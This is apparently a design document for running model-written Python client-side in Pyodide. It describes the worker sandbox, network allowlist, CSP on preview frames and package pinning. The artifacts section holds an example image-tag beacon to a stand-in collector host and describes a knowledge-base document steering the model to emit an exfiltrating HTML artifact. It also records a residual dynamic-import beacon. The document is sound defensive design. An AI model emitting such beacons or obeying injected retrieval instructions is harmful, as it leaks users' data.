# Client-side code execution (Pyodide)

Model-written Python runs in the user's browser, inside a Web Worker wrapping
[Pyodide](https://github.com/pyodide/pyodide) (CPython 3.14 compiled to
WebAssembly). Code blocks in assistant messages and python code artifacts
execute automatically when they finish streaming — no confirmation click —
because the sandbox makes auto-run safe, and an execution result behind a
click the person has to keep pressing is a result they will stop reading.

## Why client-side

This is an EU self-hosted deployment with a privacy posture: local extractor,
local redaction, self-hosted everything. Server-side untrusted-code execution
would need gVisor-class isolation on the machine that holds Postgres and
credentials, and a hole in it exposes every tenant. Client-side WASM inverts
the stake: a sandbox escape buys the attacker the user's own tab — the same
surface a malicious web page already has — no data leaves the browser, and
compute costs the deployment nothing.

## Delivery

The Pyodide dist is served same-origin from `static/pyodide/` (gitignored,
regenerated from the pinned npm package by `scripts/sync_pyodide.mjs`, wired as
the predev/prebuild hook). No CDN: a third-party request for the interpreter
would break the no-third-party posture and could drift from the tested version.
It loads lazily — the ~12 MB wasm cost is paid on the first execution, not on
page load.

## Sandbox

Everything runs in a dedicated module worker (`pyodide.worker.ts`), so the main
thread never executes model-written code and runaway code is killable.

- **Wall clock**: each run gets 20 s. WebAssembly has no cooperative
  cancellation, so the stop is `Worker.terminate()`; the session is rebuilt
  lazily and queued runs land on the fresh interpreter.
- **Network**: the worker's `fetch` is allowlisted to same-origin `/pyodide/*`
  (the runtime's own assets), and `XMLHttpRequest`, `WebSocket`,
  `EventSource`, `indexedDB`, `caches`, storage and the nested `Worker`
  constructors are deleted from the scope. Python sockets do not exist in wasm,
  so this closes the whole surface, including `pyfetch`, `micropip` and the
  `js` bridge. A worker `fetch` would otherwise carry the user's session cookie
  to any URL the code names.
- **Memory**: CPython-in-wasm has no `resource` module, so there is no hard
  RLIMIT. Allocations past the wasm heap raise a Python `MemoryError`
  (recovered), and genuinely pathological allocations are caught by the same
  wall clock as busy loops. Output is capped at 8,000 characters per stream.
- **Files**: anything loaded into the runtime is capped at 50 MB, checked
  before the bytes leave the page (Content-Length / stream abort), and
  re-checked in the worker. Files mount read-write under `/mnt/data`.

## What artifacts may and may not do

Computation auto-runs; _rendered HTML artifacts_ do not get the network. The
previews run in opaque-origin srcdoc iframes (`PREVIEW_SANDBOX` — no
`allow-same-origin`, so no cookies, storage or DOM), and a CSP applied to every
preview frame takes away what the sandbox tokens alone cannot:
`connect-src 'none'` blocks `fetch`/XHR/WebSocket, `form-action 'none'` blocks
form-based exfiltration, and images/media are limited to `data:`/`blob:` so a
`<img src="https://collector.example/?d=…">` is not a beacon. The script-src
allowlist names only the CDNs the preview wrappers themselves load (Tailwind
Play, React UMD, Mermaid); an artifact's own code runs inline. A knowledge-base
document instructing the model to emit an HTML artifact therefore cannot make
the browser fetch anything.

Residual risk, recorded rather than hidden: model code inside the worker can
still trigger a dynamic `import()` of a cross-origin URL through the `js` module
— a one-way beacon (the module loader does not go through `fetch`). Nothing is
readable from it and no cookies travel; closing it entirely would require a
CSP on the hashed worker script, which the deployment does not set per-URL.

## Knowledge-base loading

Code can analyze what the user already has. Knowledge documents are loaded as
their **indexed text** — exactly what retrieval already serves — through
`GET /api/v2/gateway/vector_stores/:store/files/:document/content`, behind the
same viewer-role access checks as every other knowledge operation. Original
binary files are deliberately not served: the gateway forwarder's comment
reserves that decision. Chat message attachments load through the existing
`/conversation/:id/output/:sha256` route. Mounted files appear at
`/mnt/data/<filename>`.

## Packages

`micropip` is pinned to `/pyodide/wheels/` on this origin. The default index
(python.pyodide.org) is unreachable behind the network gate, so by default
package installs fail with a clear "not found" rather than silently phoning
home. A deployment that wants specific packages can drop their wheels into
`static/pyodide/wheels/` and they become installable, still without any
third-party request. This is the known limitation: no arbitrary
`micropip.install("pandas")` from the public index, by design.

## Licence

Pyodide is **MPL-2.0**. The dist is served unmodified as static assets, never
linked into first-party code, so the MPL's file-level copyleft stays inside the
vendored files; first-party additions remain EUPL-1.2 per `LICENCE`/ADR 0001,
and the upstream Apache-2.0 codebase is untouched. Attribution ships beside the
runtime (`static/pyodide/NOTICE.txt`, generated by the sync script), and the
pinned version is auditable in `package-lock.json`.
